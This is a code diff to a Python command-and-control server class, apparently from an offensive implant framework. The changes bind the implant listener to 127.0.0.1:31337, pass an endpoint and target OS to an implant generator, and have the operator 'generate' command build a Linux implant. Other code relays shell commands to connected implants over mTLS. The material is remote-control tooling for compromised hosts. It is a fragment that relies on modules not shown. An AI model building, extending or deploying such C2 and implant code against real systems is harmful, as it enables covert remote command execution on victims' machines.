@@ -19,7 +19,11 @@ class C2Server(object):
         ## Generating stuff for implant comms ##
         print("Listening for implants...")
         self.requestq = Queue() #this is a shared queue between the handler and the listner, which fills with implant registration
-        self.implantlistener = mtls.Listener(self.requestq) #begins implant listener w/ mtls encryption
+        try:
+            self.implantlistener = mtls.Listener(self.requestq, "127.0.0.1:31337") #begins implant listener w/ mtls encryption
+        except Exception as e:
+            print(e)
+            exit(1)
 
         ## Generating stuff for operator comms ##
         print("Listening for operators...")
@@ -50,16 +54,13 @@ class C2Server(object):
 
     def _shell_session(self, command_str, session_id):
             conn, addr = self.implantlistener.sessions.get(session_id) 
-
             output = mtls.session(conn, command_str)
-
-
             return (output)
 
-    def _generate(self):
+    def _generate(self, endpoint, target_os):
         # Compile an implant
         print("Generating the implant...")
-        generate(self.implantlistener.client_certs)
+        generate(self.implantlistener.client_certs, endpoint, target_os)
 
     def _accept_operator(self):
         numberOfUsers = 5
@@ -105,7 +106,7 @@ class C2Server(object):
                 logging.info("Command: " + command_str)
 
                 if (command_str == "generate"):
-                    response = self._generate()
+                    response = self._generate("127.0.0.1:31337", "linux")
 
                 else:
                     print("[+]Disconnected operator " + address[0] +":"+ str(address[1]))
